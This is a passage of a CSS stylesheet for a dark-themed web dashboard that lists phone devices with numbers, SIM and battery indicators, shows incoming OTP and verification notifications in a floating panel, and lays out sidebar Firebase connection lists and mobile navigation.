  .phone-edit-in { font-size:12px; padding:5px 8px; border-radius:5px; flex:1; min-width:0; }
  .edit-ph-btn { background:none; border:none; font-size:11px; color:#64748b; cursor:pointer; padding:2px 5px; border-radius:4px; font-family:inherit; transition:all 120ms; }
  .edit-ph-btn:hover { color:#f97316; background:rgba(249,115,22,0.08); }
  .add-ph { color:#f97316!important; border:1px dashed rgba(249,115,22,0.35)!important; padding:4px 9px!important; }

  /* ── Device card grid (replaces table) ────────────────────────────────── */
    /* ── Device card grid (2 columns on desktop/web) ────────────────────────── */
  .dev-card-grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 8px;
    padding: 8px;
    background: transparent;
  }
  @media (max-width: 600px) {
    .dev-card-grid {
      grid-template-columns: 1fr !important;
      gap: 6px !important;
      padding: 6px !important;
    }
  }
  .dev-card {
    display:flex; align-items:center; gap:10px;
    padding:10px 12px; background:#0f1523;
    cursor:pointer; position:relative; overflow:hidden;
    transition:background 100ms;
    min-height:56px;
  }
  .dev-card:hover { background:#141b2d; }
  .dev-card-sel { background:rgba(249,115,22,0.06)!important; }
  .dev-card-used { opacity:0.4; }
  .dev-card-bar { width:3px; height:calc(100% - 14px); border-radius:2px; flex-shrink:0; position:absolute; left:0; top:7px; }
  .dev-card-dot { flex-shrink:0; margin-left:8px; }
  .dev-card-body { flex:1; min-width:0; display:flex; flex-direction:column; gap:2px; }
  .dev-card-id-row { display:flex; align-items:center; gap:5px; }
  .dev-card-id { font-size:12px; color:#e2e8f0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
  .dev-card-sub { display:flex; align-items:center; gap:6px; }
  .dev-card-phone { font-size:11.5px; color:#94a3b8; font-family:'JetBrains Mono',monospace; }
  .dev-card-no-num { font-size:10.5px; color:#334155; font-style:italic; }
  .dev-card-sim { font-size:9.5px; color:#475569; background:rgba(255,255,255,0.05); padding:1px 5px; border-radius:3px; }
  .dev-card-right { display:flex; align-items:center; gap:6px; flex-shrink:0; }
  .dev-card-bat { font-size:11px; font-weight:700; padding:2px 7px; border-radius:5px; font-family:'JetBrains Mono',monospace; }
  .dev-card-arrow { color:#334155; transition:color 120ms; }
  .dev-card:hover .dev-card-arrow { color:#64748b; }
  .dt-empty { text-align:center; padding:32px 16px; color:#334155; font-size:13px; }
  /* Small icon-only copy button */
  .icon-btn-xs {
    width:20px; height:20px; border-radius:4px; border:none; padding:0;
    background:rgba(255,255,255,0.06); color:rgba(255,255,255,0.3);
    cursor:pointer; display:flex; align-items:center; justify-content:center;
    flex-shrink:0; transition:all 130ms;
  }
  .icon-btn-xs:hover { background:rgba(56,189,248,0.18); color:#38bdf8; }
  .icon-btn-xs:active { transform:scale(0.92); }

  /* ── Floating Notification Panel ──────────────────────────────────────── */
  .np-panel {
    position:fixed; top:12px; right:12px; z-index:200;
    width:min(340px, calc(100vw - 24px));
    display:flex; flex-direction:column;
    background:rgba(10,14,26,0.82);
    -webkit-backdrop-filter:blur(32px) saturate(180%);
    backdrop-filter:blur(32px) saturate(180%);
    border:1px solid rgba(255,255,255,0.12);
    border-radius:18px;
    box-shadow:0 24px 60px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.1);
    overflow:hidden;
  }
  .np-header {
    display:flex; align-items:center; gap:6px;
    padding:11px 14px 10px;
    border-bottom:1px solid rgba(255,255,255,0.07);
  }
  .np-title { font-size:13px; font-weight:700; color:#e2e8f0; flex:1; }
  .np-badge {
    font-size:10px; font-weight:800; padding:2px 7px; border-radius:20px;
    background:#f97316; color:#fff; font-family:'JetBrains Mono',monospace;
  }
  .np-header-actions { display:flex; align-items:center; gap:4px; }
  .np-icon-btn {
    width:26px; height:26px; border-radius:7px; border:none; padding:0;
    background:rgba(255,255,255,0.07); color:rgba(255,255,255,0.5);
    cursor:pointer; display:flex; align-items:center; justify-content:center;
    transition:all 140ms;
  }
  .np-icon-btn:hover { background:rgba(255,255,255,0.14); color:#fff; }
  .np-icon-btn:active { transform:scale(0.9); }
  .np-trash:hover { background:rgba(239,68,68,0.25)!important; color:#ef4444!important; }

  /* Cards scroll area */
  .np-cards { display:flex; flex-direction:column; max-height:60vh; overflow-y:auto; scrollbar-width:none; }
  .np-cards::-webkit-scrollbar { display:none; }
  .np-expanded { max-height:70vh; }

  .np-card {
    padding:10px 13px 6px;
    border-bottom:1px solid rgba(255,255,255,0.05);
    position:relative; overflow:hidden;
    animation:np-in 0.28s cubic-bezier(0.34,1.4,0.64,1) both;
  }
  .np-leaving { animation:np-out 0.22s ease forwards; }
  .np-card:last-child { border-bottom:none; }

  /* Card top row */
  .np-card-top { display:flex; align-items:center; gap:7px; margin-bottom:4px; }
  .np-app-ico {
    width:30px; height:30px; border-radius:8px; flex-shrink:0;
    display:flex; align-items:center; justify-content:center;
    font-size:13px; font-weight:800;
  }
  .np-card-title-col { display:flex; align-items:center; gap:5px; flex:1; min-width:0; }
  .np-service { font-size:12px; font-weight:700; color:#e2e8f0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
  .np-type-badge { font-size:8px; font-weight:800; padding:1px 5px; border-radius:4px; background:rgba(52,211,153,0.15); color:#34d399; border:1px solid rgba(52,211,153,0.3); flex-shrink:0; }
  .np-time { font-size:9.5px; color:rgba(255,255,255,0.4); font-family:'JetBrains Mono',monospace; flex-shrink:0; }
  .np-dismiss {
    width:18px; height:18px; border-radius:50%; border:none; padding:0;
    background:rgba(255,255,255,0.07); color:rgba(255,255,255,0.4);
    cursor:pointer; font-size:14px; line-height:1; display:flex; align-items:center; justify-content:center;
    flex-shrink:0; font-family:inherit; transition:all 140ms;
  }
  .np-dismiss:hover { background:rgba(239,68,68,0.3); color:#fff; }

  /* Message preview */
  .np-msg { font-size:10.5px; color:rgba(255,255,255,0.55); margin-bottom:6px; line-height:1.35;
    overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }

  /* OTP row */
  .np-otp-row {
    display:flex; align-items:center; gap:5px;
    background:rgba(6,78,59,0.45); border:1px solid rgba(52,211,153,0.3); border-radius:10px;
    padding:5px 8px; margin-bottom:4px;
  }
  .np-otp-lock { color:rgba(52,211,153,0.6); flex-shrink:0; display:flex; align-items:center; }
  .np-otp-masked {
    font-family:'JetBrains Mono',monospace; font-size:15px; font-weight:900;
    color:#4ade80; letter-spacing:0.1em; flex:1;
    text-shadow:0 0 10px rgba(74,222,128,0.3);
  }
  /* Square icon buttons */
  .np-icon-sq {
    width:26px; height:26px; border-radius:7px; border:none; padding:0;
    cursor:pointer; display:flex; align-items:center; justify-content:center;
    flex-shrink:0; transition:all 130ms;
  }
  .np-icon-sq:active { transform:scale(0.9); }
  .np-otp-copy { background:rgba(52,211,153,0.15); color:rgba(74,222,128,0.6); }
  .np-otp-copy:hover { background:rgba(52,211,153,0.3); color:#4ade80; }
  /* Device ID section */
  .np-dev-sep { width:1px; height:16px; background:rgba(255,255,255,0.1); flex-shrink:0; }
  .np-dev-ico { color:rgba(56,189,248,0.5); flex-shrink:0; }
  .np-dev-id { font-family:'JetBrains Mono',monospace; font-size:10px; color:rgba(56,189,248,0.7); flex:1; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
  .np-dev-copy { background:rgba(56,189,248,0.1); color:rgba(56,189,248,0.5); }
  .np-dev-copy:hover { background:rgba(56,189,248,0.22); color:#38bdf8; }
  .np-navigate { background:rgba(99,102,241,0.15); color:rgba(129,140,248,0.6); }
  .np-navigate:hover { background:rgba(99,102,241,0.28); color:#818cf8; }

  /* VERIF row */
  .np-verif-row { display:flex; align-items:center; gap:6px; background:rgba(56,189,248,0.07); border:1px solid rgba(56,189,248,0.15); border-radius:8px; padding:5px 8px; margin-bottom:4px; }
  .np-verif-badge { font-size:8px; font-weight:800; text-transform:uppercase; letter-spacing:0.1em; color:#38bdf8; flex-shrink:0; }
  .np-verif-msg { font-size:10.5px; color:rgba(255,255,255,0.6); flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }

  /* Bottom shimmer bar */
  .np-bar { position:absolute; bottom:0; left:0; right:0; height:2px; opacity:0.6; }

  /* Footer show all */
  .np-footer {
    display:flex; align-items:center; justify-content:center; gap:6px;
    padding:10px; border-top:1px solid rgba(255,255,255,0.07);
    background:rgba(255,255,255,0.03);
    color:rgba(255,255,255,0.5); font-size:12px; font-weight:600;
    cursor:pointer; border:none; font-family:inherit; width:100%;
    transition:all 140ms;
  }
  .np-footer:hover { color:#e2e8f0; background:rgba(255,255,255,0.07); }

  /* Collapsed bell */
  .np-collapsed-btn {
    position:fixed; top:12px; right:12px; z-index:200;
    width:42px; height:42px; border-radius:13px;
    background:rgba(10,14,26,0.85); border:1px solid rgba(255,255,255,0.12);
    color:rgba(255,255,255,0.6); cursor:pointer;
    display:flex; align-items:center; justify-content:center;
    -webkit-backdrop-filter:blur(20px); backdrop-filter:blur(20px);
    transition:all 140ms; box-shadow:0 8px 24px rgba(0,0,0,0.4);
  }
  .np-collapsed-btn:hover { border-color:rgba(249,115,22,0.5); color:#f97316; }
  .np-collapsed-cnt {
    position:absolute; top:-4px; right:-4px;
    background:#f97316; color:#fff; font-size:9px; font-weight:800;
    min-width:16px; height:16px; border-radius:8px; padding:0 3px;
    display:flex; align-items:center; justify-content:center;
    font-family:'JetBrains Mono',monospace;
  }

  /* Panel animations */
  @keyframes np-in {
    from { opacity:0; transform:translateY(-6px); }
    to   { opacity:1; transform:translateY(0); }
  }
  @keyframes np-out {
    from { opacity:1; max-height:120px; }
    to   { opacity:0; max-height:0; padding:0; margin:0; }
  }

  /* ── Mobile Bottom Navigation Bar ─────────────────────────────────────── */
  .bottom-nav {
    display:none; /* desktop: hidden */
  }

  @media (max-width: 768px) {
    .bottom-nav {
      display:flex; position:fixed; bottom:0; left:0; right:0; z-index:300;
      background:rgba(10,14,26,0.92);
      -webkit-backdrop-filter:blur(24px) saturate(180%);
      backdrop-filter:blur(24px) saturate(180%);
      border-top:1px solid rgba(255,255,255,0.1);
      padding:0 0 env(safe-area-inset-bottom, 0);
      height:calc(60px + env(safe-area-inset-bottom, 0));
    }
    .bn-item {
      flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center;
      gap:3px; padding:8px 4px; border:none; background:none;
      color:rgba(255,255,255,0.35); cursor:pointer; font-family:inherit;
      transition:all 150ms; min-height:48px;
    }
    .bn-item:hover { color:rgba(255,255,255,0.6); }
    .bn-item.bn-active { color:#f97316; }
    .bn-label { font-size:10px; font-weight:600; letter-spacing:0.02em; line-height:1; }

    /* Push tab body above bottom nav */
    .tab-body { padding-bottom: 80px; }

    /* Bell panel: full width on mobile, positioned from top */
    .bell-panel {
      top: 58px; right: 8px; left: 8px; width: auto;
      border-radius: 18px;
      max-height: calc(100vh - 140px);
    }

    /* Smaller device cards on mobile */
    .dev-card { padding: 9px 10px; min-height: 52px; }
    .dev-card-id { font-size: 11.5px; }
    .dev-card-grid { grid-template-columns: 1fr; gap: 6px; padding: 6px; }
  }


  @keyframes notif-in  { 
    0%   { opacity:0; transform:translateX(24px) scale(0.92); filter:blur(4px); }
    60%  { opacity:1; filter:blur(0); }
    100% { opacity:1; transform:translateX(0) scale(1); filter:blur(0); }
  }
  @keyframes notif-out { 
    0%   { opacity:1; transform:scale(1) translateX(0); max-height:200px; }
    100% { opacity:0; transform:scale(0.9) translateX(16px); max-height:0; margin:0; padding:0; }
  }
  /* ── Bell notification badge ─────────────────────────────────────────── */
  .bell-wrap { position: relative; display: inline-flex; }
  .notif-badge {
    position: absolute; top: -5px; right: -5px;
    min-width: 17px; height: 17px; border-radius: 9px;
    background: #ef4444; color: #fff;
    font-size: 9px; font-weight: 800;
    display: flex; align-items: center; justify-content: center;
    padding: 0 3px; pointer-events: none;
    border: 2px solid #0b0e17;
    animation: badge-pop 0.3s cubic-bezier(0.34, 1.56, 0.64, 1) both;
  }
  @keyframes badge-pop { from { transform: scale(0); } to { transform: scale(1); } }

  /* ── Bell backdrop ──────────────────────────────────────────────────────── */
  .bell-backdrop {
    position: fixed; inset: 0; z-index: 290;
    background: rgba(0,0,0,0.15);
  }

  /* ── Bell floating panel ─────────────────────────────────────────────────── */
  .bell-panel {
    position: fixed; top: 52px; right: 12px; z-index: 300;
    width: 340px; max-height: calc(100vh - 80px);
    display: flex; flex-direction: column;
    background: rgba(11,16,30,0.96);
    -webkit-backdrop-filter: blur(40px) saturate(200%);
    backdrop-filter: blur(40px) saturate(200%);
    border: 1px solid rgba(255,255,255,0.12);
    border-top-color: rgba(255,255,255,0.2);
    border-radius: 20px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.12);
    overflow: hidden;
    animation: panel-drop 0.28s cubic-bezier(0.34, 1.3, 0.64, 1) both;
  }
  @keyframes panel-drop {
    from { opacity: 0; transform: translateY(-10px) scale(0.97); }
    to   { opacity: 1; transform: translateY(0) scale(1); }
  }

  /* Panel header */
  .bp-hdr {
    display: flex; align-items: center; gap: 8px;
    padding: 12px 14px 10px;
    border-bottom: 1px solid rgba(255,255,255,0.08);
    flex-shrink: 0;
  }
  .bp-title { font-size: 13px; font-weight: 700; color: #e2e8f0; flex: 1; }
  .bp-cnt { color: #64748b; font-weight: 600; }
  .bp-actions { display: flex; align-items: center; gap: 4px; }
  .bp-icon-btn {
    width: 28px; height: 28px; border-radius: 8px;
    border: 1px solid rgba(255,255,255,0.1);
    background: rgba(255,255,255,0.04); color: #64748b;
    cursor: pointer; display: flex; align-items: center; justify-content: center;
    transition: all 140ms; font-family: inherit; flex-shrink: 0;
  }
  .bp-icon-btn:hover { color: #e2e8f0; border-color: rgba(255,255,255,0.2); background: rgba(255,255,255,0.08); }
  .bp-muted { color: #ef4444!important; border-color: rgba(239,68,68,0.35)!important; background: rgba(239,68,68,0.08)!important; }

  /* Panel empty state */
  .bp-empty {
    padding: 28px 16px; text-align: center;
    color: #475569; font-size: 13px;
  }

  /* Panel notification list */
  .bp-list {
    overflow-y: auto; flex: 1;
    padding: 8px; display: flex; flex-direction: column; gap: 6px;
    scrollbar-width: thin; scrollbar-color: rgba(255,255,255,0.08) transparent;
  }
  .bp-list::-webkit-scrollbar { width: 3px; }
  .bp-list::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 3px; }

  /* Notification card inside bell panel */
  .bp-card {
    background: rgba(255,255,255,0.05);
    border: 1px solid rgba(255,255,255,0.09);
    border-radius: 14px;
    padding: 9px 11px;
    display: flex; flex-direction: column; gap: 7px;
    animation: notif-in 0.25s ease both;
    transition: opacity 0.25s, transform 0.25s;
  }
  .bp-card.nleave { animation: notif-out 0.22s ease forwards; }
  .bp-card:hover { background: rgba(255,255,255,0.07); }

  /* Card top row */
  .bp-card-top {
    display: flex; align-items: flex-start; gap: 8px;
  }
  .bp-app-icon {
    width: 34px; height: 34px; border-radius: 9px; border: 1px solid;
    display: flex; align-items: center; justify-content: center;
    flex-shrink: 0;
  }
  .bp-card-mid { flex: 1; min-width: 0; display: flex; flex-direction: column; gap: 2px; }
  .bp-sender { font-size: 12px; font-weight: 700; color: #e2e8f0; }
  .bp-msg-preview { font-size: 11px; color: #64748b; line-height: 1.3; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
  .bp-time { font-size: 10px; color: #475569; font-family: 'JetBrains Mono', monospace; flex-shrink: 0; white-space: nowrap; padding-top: 2px; }

  /* Card bottom row */
  .bp-card-bot {
    display: flex; align-items: center; gap: 5px; flex-wrap: wrap;
    position: relative;
  }

  /* OTP pill */
  .bp-otp-pill {
    display: inline-flex; align-items: center; gap: 6px;
    background: linear-gradient(135deg, rgba(52,211,153,0.15), rgba(16,185,129,0.05));
    border: 1px solid rgba(52,211,153,0.4);
    border-radius: 10px; padding: 5px 10px;
    cursor: pointer; font-family: inherit; color: #4ade80;
    transition: all 150ms; flex-shrink: 0;
  }
  .bp-otp-pill:hover { border-color: rgba(52,211,153,0.7); background: rgba(52,211,153,0.2); }
  .bp-otp-code {
    font-family: 'JetBrains Mono', monospace; font-size: 15px; font-weight: 900;
    color: #4ade80; letter-spacing: 0.1em;
  }

  /* Device pill */
  .bp-dev-pill {
    display: inline-flex; align-items: center; gap: 5px;
    background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.12);
    border-radius: 8px; padding: 4px 8px;
    cursor: pointer; font-family: inherit; color: #94a3b8; font-size: 10px;
    transition: all 150ms; flex-shrink: 0;
  }
  .bp-dev-pill:hover { background: rgba(255,255,255,0.1); color: #e2e8f0; }

  /* Navigate button */
  .bp-nav-btn {
    margin-left: auto; flex-shrink: 0;
    width: 28px; height: 28px; border-radius: 8px;
    border: 1px solid rgba(249,115,22,0.3); background: rgba(249,115,22,0.1);
    color: #f97316; cursor: pointer; display: flex; align-items: center; justify-content: center;
    transition: all 150ms;
  }
  .bp-nav-btn:hover { background: rgba(249,115,22,0.2); border-color: rgba(249,115,22,0.6); }

  /* Progress bar at bottom of card */
  .bp-progress {
    position: absolute; bottom: -7px; left: 0; right: 0; height: 2px;
    background: linear-gradient(90deg, #22c55e, transparent);
    border-radius: 0 0 10px 10px;
    animation: bp-shrink 30s linear both;
  }
  @keyframes bp-shrink { from { width: 100%; } to { width: 0%; } }

  /* Verif chip */
  .bp-verif-chip {
    font-size: 9px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.1em;
    padding: 3px 7px; border-radius: 6px;
    background: rgba(56,189,248,0.1); color: #38bdf8; border: 1px solid rgba(56,189,248,0.25);
    flex-shrink: 0;
  }
  .bp-verif-text { font-size: 11px; color: rgba(255,255,255,0.6); flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }

  /* ── Icon copy button (xs) ────────────────────────────────────────────── */
  .icon-btn-xs {
    background: none; border: none; color: #475569; cursor: pointer;
    padding: 3px; border-radius: 4px; transition: all 120ms;
    display: inline-flex; align-items: center; flex-shrink: 0;
  }
  .icon-btn-xs:hover { color: #94a3b8; background: rgba(255,255,255,0.08); }

  /* ── Device card grid (2 columns on desktop/web) ────────────────────────── */
  .dev-card-grid {
    display: grid;
    grid-template-columns: repeat(2, minmax(0, 1fr));
    gap: 8px;
    padding: 8px;
  }
  .dev-card {
    display: flex; align-items: center; gap: 10px;
    background: #141b2d; border: 1px solid rgba(255,255,255,0.07);
    border-radius: 12px; padding: 10px 12px;
    cursor: pointer; position: relative; overflow: hidden;
    transition: background 100ms, border-color 100ms;
    min-height: 56px;
  }
  .dev-card:hover { background: #1a2238; border-color: rgba(255,255,255,0.13); }
  .dev-card.dev-card-sel { background: rgba(249,115,22,0.08); border-color: rgba(249,115,22,0.4); }
  .dev-card.dev-card-used { opacity: 0.45; }
  .dev-card.dev-card-used .dev-card-id { text-decoration: line-through; }
  .dev-card-bar { position: absolute; left: 0; top: 0; bottom: 0; width: 3px; border-radius: 12px 0 0 12px; }
  .dev-card-dot { flex-shrink: 0; margin-left: 4px; }
  .dev-card-body { flex: 1; min-width: 0; display: flex; flex-direction: column; gap: 2px; }
  .dev-card-id-row { display: flex; align-items: center; gap: 5px; }
  .dev-card-id { font-size: 12px; font-weight: 700; color: #e2e8f0; font-family: 'JetBrains Mono', monospace; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
  .dev-card-sub { display: flex; align-items: center; gap: 5px; flex-wrap: nowrap; min-width: 0; }
  .dev-card-phone { font-size: 11.5px; color: #94a3b8; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex: 1; min-width: 0; }
  .dev-card-no-num { font-size: 11px; color: #475569; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
  .dev-card-sim { font-size: 10px; color: #475569; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08); border-radius: 5px; padding: 1px 5px; flex-shrink: 0; }
  .dev-card-right { display: flex; align-items: center; gap: 6px; flex-shrink: 0; }
  .dev-card-bat { font-size: 11px; font-weight: 700; padding: 2px 6px; border-radius: 6px; font-family: 'JetBrains Mono', monospace; flex-shrink: 0; }
  .dev-card-arrow { color: #334155; flex-shrink: 0; transition: color 120ms; }
  .dev-card:hover .dev-card-arrow { color: #64748b; }
  .dt-empty { padding: 32px; text-align: center; color: #334155; font-size: 13px; }

  /* ── Sidebar X close button ──────────────────────────────────────────────── */
  .side-close-btn {
    margin-left: auto; background: none; border: none; cursor: pointer;
    color: #475569; padding: 4px; border-radius: 6px;
    display: flex; align-items: center; transition: all 120ms;
  }
  .side-close-btn:hover { color: #e2e8f0; background: rgba(255,255,255,0.08); }

  /* ── Sidebar full-height Firebase scroll ─────────────────────────────────── */
  .side-footer-full {
    flex: 1; display: flex; flex-direction: column; overflow: hidden;
    border-top: 1px solid rgba(255,255,255,0.06);
    padding-top: 6px; min-height: 0;
  }
  .conn-scroll-full {
    flex: 1; overflow-y: auto; overflow-x: hidden;
    max-height: none !important;
    scrollbar-width: thin; scrollbar-color: rgba(255,255,255,0.08) transparent;
  }
  .conn-scroll-full::-webkit-scrollbar { width: 3px; }
  .conn-scroll-full::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 3px; }
  /* Inline add-Firebase button in header */
  .add-fb-inline {
    margin-left: auto; background: rgba(249,115,22,0.12); border: 1px solid rgba(249,115,22,0.3);
    border-radius: 6px; width: 22px; height: 22px; cursor: pointer;
    color: #f97316; display: flex; align-items: center; justify-content: center;
    transition: all 120ms; flex-shrink: 0;
  }
  .add-fb-inline:hover { background: rgba(249,115,22,0.2); }

  /* ── Pagination bar ──────────────────────────────────────────────────────── */
  
  .pag-btn {
    width: 32px; height: 32px; border-radius: 8px;
    background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.08);
    color: #64748b; cursor: pointer; display: flex; align-items: center; justify-content: center;
    transition: all 120ms; font-family: inherit;
  }
  .pag-btn:hover:not(:disabled) { background: rgba(255,255,255,0.1); color: #e2e8f0; border-color: rgba(255,255,255,0.2); }
  .pag-btn:disabled { opacity: 0.25; cursor: default; }
  .pag-info {
    font-size: 12px; color: #64748b; font-weight: 600; min-width: 56px; text-align: center;
    font-family: 'JetBrains Mono', monospace;
  }

  /* ── Dev card grid - single column on mobile ─────────────────────────── */
  /* (defined above at line 2681 — no override needed here) */

  /* ── Dev card layout tweaks for mobile ──────────────────────────────────── */
  .dev-card {
    min-height: 52px; padding: 8px 10px;
  }
  .dev-card-id { font-size: 11.5px; }
  .dev-card-phone { font-size: 11px; }
  .dev-card-bat { font-size: 10px; padding: 2px 5px; }

  /* ── Settings toggle in add panel ───────────────────────────────────────── */
  .ap-settings {
    margin-top: 14px; padding-top: 12px;
    border-top: 1px solid rgba(255,255,255,0.07);
  }
  .aps-title {
    font-size: 10px; font-weight: 700; text-transform: uppercase;
    letter-spacing: 0.08em; color: #475569; margin-bottom: 10px;
  }
  .aps-row {
    display: flex; align-items: center; justify-content: space-between;
    gap: 10px; cursor: pointer;
  }
  .aps-lbl {
    display: flex; align-items: center; gap: 6px;
    font-size: 13px; color: #94a3b8; font-weight: 500;
  }
  .aps-tog {
    width: 42px; height: 24px; border-radius: 12px;
    background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.12);
    position: relative; cursor: pointer; transition: all 220ms; flex-shrink: 0;
    padding: 0;
  }
  .aps-tog.aps-on {
    background: rgba(34,197,94,0.3); border-color: rgba(34,197,94,0.5);
  }
  .aps-knob {
    position: absolute; top: 3px; left: 3px;
    width: 16px; height: 16px; border-radius: 50%;
    background: #64748b; transition: all 220ms;
    display: block;
  }
  .aps-tog.aps-on .aps-knob {
    transform: translateX(18px); background: #22c55e;
  }

  /* ── Bell panel drag handle cursor ──────────────────────────────────────── */
  .bp-drag-handle { cursor: grab; }
  .bp-drag-handle:active { cursor: grabbing; }

  /* Reset panel position when re-opened */
  /* (handled via notifPanelPos reset in showBellPanel toggle) */

  /* ── Mobile: smaller text across the board ──────────────────────────────── */
  @media (max-width: 768px) {
    .dev-card-id { font-size: 11px; }
    .dev-card-phone { font-size: 10.5px; }
    .dev-card-bat { font-size: 9.5px; padding: 1px 4px; }
    .dt-chip { font-size: 10px; padding: 4px 8px; }
    .dt-chip-cnt { font-size: 9px; }
    .conn-badge { font-size: 10px; padding: 3px 8px; }
    .sc-n { font-size: 24px !important; }
    .lc-title { font-size: 15px; }
    .lc-sub { font-size: 11px; }
    .pag-info { font-size: 11px; }
    .pag-btn { width: 28px; height: 28px; }

    /* Notification panel: full width, max height 70vh */
    .bell-panel {
      top: 56px; left: 8px; right: 8px; width: auto;
      max-height: 70vh;
      border-radius: 18px;
    }
    .bp-sender { font-size: 11px; }
    .bp-msg-preview { font-size: 10px; }
    .bp-time { font-size: 9px; }
    .bp-otp-code { font-size: 13px; }
  }

  /* ── Sidebar tabs ─────────────────────────────────────────────────────────── */
  .side-online-pill {
    margin-left: auto; font-size: 9px; font-weight: 800; padding: 2px 7px;
    border-radius: 10px; background: rgba(34,197,94,0.15); color: #22c55e;
    border: 1px solid rgba(34,197,94,0.3); white-space: nowrap; flex-shrink: 0;
  }
  .side-tabs {
    display: flex; gap: 2px; padding: 6px 8px 0;
    border-bottom: 1px solid rgba(255,255,255,0.06); flex-shrink: 0;
  }
  .side-tab-btn {
    flex: 1; padding: 6px 4px; border-radius: 6px 6px 0 0;
    font-size: 11px; font-weight: 700; cursor: pointer;
    border: none; background: transparent; color: #475569;
    font-family: inherit; transition: all 130ms; display: flex;
    align-items: center; justify-content: center; gap: 4px;
  }
  .side-tab-btn:hover { color: #94a3b8; }
  .stab-a { color: #f97316 !important; border-bottom: 2px solid #f97316; }
  .stab-cnt { font-size: 9px; font-weight: 800; background: rgba(255,255,255,0.08);
    padding: 1px 5px; border-radius: 8px; font-family: 'JetBrains Mono',monospace; }

  /* ── Sidebar device list ──────────────────────────────────────────────────── */
  .side-dev-search {
    display: flex; align-items: center; gap: 5px;
    margin: 6px 8px 2px; padding: 6px 8px;
    background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.07);
    border-radius: 7px; flex-shrink: 0;
  }
  .side-dev-search-in {
    background: none; border: none; outline: none; font-size: 11.5px;
    color: #e2e8f0; width: 100%; font-family: inherit;
  }
  .side-dev-search-in::placeholder { color: #334155; }
  .side-search-clear {
    background: none; border: none; color: #475569; cursor: pointer;
    font-size: 14px; line-height: 1; padding: 0 2px; font-family: inherit;
  }
  .side-dev-pills {
    display: flex; gap: 3px; padding: 3px 8px 4px; flex-shrink: 0;
  }
  .sdp {
    flex: 1; padding: 3px 2px; border-radius: 5px;
    border: 1px solid rgba(255,255,255,0.07); background: transparent;
    color: #475569; font-size: 10.5px; font-weight: 700; cursor: pointer;
    font-family: inherit; transition: all 120ms; display: flex;
    align-items: center; justify-content: center; gap: 3px;
  }
  .sdp:hover { color: #94a3b8; border-color: rgba(255,255,255,0.15); }
  .sdp-a   { background: rgba(249,115,22,0.15)!important; color: #f97316!important; border-color: rgba(249,115,22,0.4)!important; }
  .sdp-on  { background: rgba(34,197,94,0.14)!important;  color: #22c55e!important; border-color: rgba(34,197,94,0.3)!important; }
  .sdp-num { background: rgba(56,189,248,0.12)!important; color: #38bdf8!important; border-color: rgba(56,189,248,0.3)!important; }
  .sdp-off { background: rgba(239,68,68,0.1)!important;   color: #ef4444!important; border-color: rgba(239,68,68,0.25)!important; }
  .sdp-cnt { font-family: 'JetBrains Mono',monospace; font-size: 9px; }

  .side-dev-list {
    flex: 1; overflow-y: auto; overflow-x: hidden;
    scrollbar-width: thin; scrollbar-color: rgba(255,255,255,0.08) transparent;
    display: flex; flex-direction: column;
  }
  .side-dev-list::-webkit-scrollbar { width: 3px; }
  .side-dev-list::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 3px; }

  .sdv-item {
    display: flex; align-items: center; gap: 7px;
    padding: 7px 8px 7px 12px; cursor: pointer;
    border: none; background: transparent; text-align: left;
    font-family: inherit; position: relative;
    border-bottom: 1px solid rgba(255,255,255,0.03);
    transition: background 80ms; min-height: 44px; width: 100%;
  }
  .sdv-item:hover { background: rgba(255,255,255,0.04); }
  .sdv-item.sdv-sel { background: rgba(249,115,22,0.08); }
  .sdv-bar { position: absolute; left: 0; top: 4px; bottom: 4px; width: 3px; border-radius: 2px; flex-shrink: 0; }
  .sdv-dot { width: 6px; height: 6px; border-radius: 50%; flex-shrink: 0; }
  .sdv-body { flex: 1; min-width: 0; display: flex; flex-direction: column; gap: 1px; }
  .sdv-id   { font-size: 11px; font-weight: 600; color: #e2e8f0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
  .sdv-phone { font-size: 10.5px; color: #94a3b8; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-family: 'JetBrains Mono',monospace; }
  .sdv-fb   { font-size: 10px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
  .sdv-bat  { font-size: 10px; font-weight: 700; flex-shrink: 0; font-family: 'JetBrains Mono',monospace; }
  .sdv-copy {
    width: 20px; height: 20px; border-radius: 4px; border: none;
    background: rgba(255,255,255,0.06); color: rgba(255,255,255,0.3);
    cursor: pointer; display: flex; align-items: center; justify-content: center;
    flex-shrink: 0; transition: all 120ms; padding: 0;
  }
  .sdv-copy:hover { background: rgba(56,189,248,0.18); color: #38bdf8; }
  .sdv-empty { padding: 24px 12px; text-align: center; color: #334155; font-size: 12px; }
  .sdv-more {
    width: 100%; padding: 8px; font-size: 11px; color: #f97316;
    background: none; border: none; border-top: 1px solid rgba(255,255,255,0.05);
    cursor: pointer; font-family: inherit; transition: background 120ms;
  }
  .sdv-more:hover { background: rgba(249,115,22,0.06); }

  /* ── Dashboard filter chip: online-numbers count ──────────────────────────── */
  .dt-chip-online {
    font-size: 9px; font-weight: 800; padding: 1px 5px;
    border-radius: 8px; background: rgba(34,197,94,0.15);
